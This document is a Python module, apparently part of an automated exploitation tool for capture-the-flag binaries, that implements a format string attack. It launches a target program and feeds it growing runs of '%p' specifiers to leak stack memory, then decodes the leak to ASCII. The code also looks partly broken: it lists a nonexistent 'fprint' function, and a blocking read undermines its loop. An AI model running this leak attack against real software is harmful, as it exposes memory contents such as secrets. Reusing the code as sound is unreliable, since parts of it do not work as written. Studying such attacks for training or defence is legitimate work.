from time import sleep
from typing import List
from exploits.exploit import Exploit
from util.hex_filter import convert_hex_to_ascii, filter_hex_values
import subprocess

class StringFormatAttack(Exploit):
    def __init__(self):
        self._name = "string format attack"
        self._vulnerable_functions = [
            "fprint",
            "printf",
            "sprintf",
            "snprintf",
            "vfprintf",
            "vprintf",
            "vsprintf",
            "vsnprintf",
        ]
        self._found_vulnerable_functions = []

    @property
    def name(self) -> str:
        return self._name

    @property
    def vulnerable_functions(self) -> List[str]:
        return self._vulnerable_functions

    @property
    def found_vulnerable_functions(self) -> List[str]:
        return self._found_vulnerable_functions

    # specifier telkens itereren als flag structuur niet is gevonden
    # als de hoeveelheid specifiers kleiner is dan de aantal hex waardes, dan stoppen -> gefaald

    # eerst ervoor zorgen dat de programma meerdere keren gerunt wordt en dat de output logisch gescheiden kan worden.
    def attempt_exploit(self, path):
        print("Attempting string format attack")
        process = subprocess.Popen(
            f'"{path}"',
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        )

        try:
            iteration = 34
            while True:
                input_str = " ".join(["%p"] * iteration) + "\n"

                process.stdin.write(input_str.encode())
                process.stdin.flush()

                output = process.stdout.read()
                hex_values = filter_hex_values(output.decode())
                ascii_strings = [convert_hex_to_ascii(hex_val) for hex_val in hex_values]
                print(ascii_strings)

                # allow the process to terminate
                sleep(0.001)
                if process.poll() is not None:
                    print("Process terminated")
                    break

                iteration += 1

        except Exception as e:
            print(f"Exception occurred: {e}")
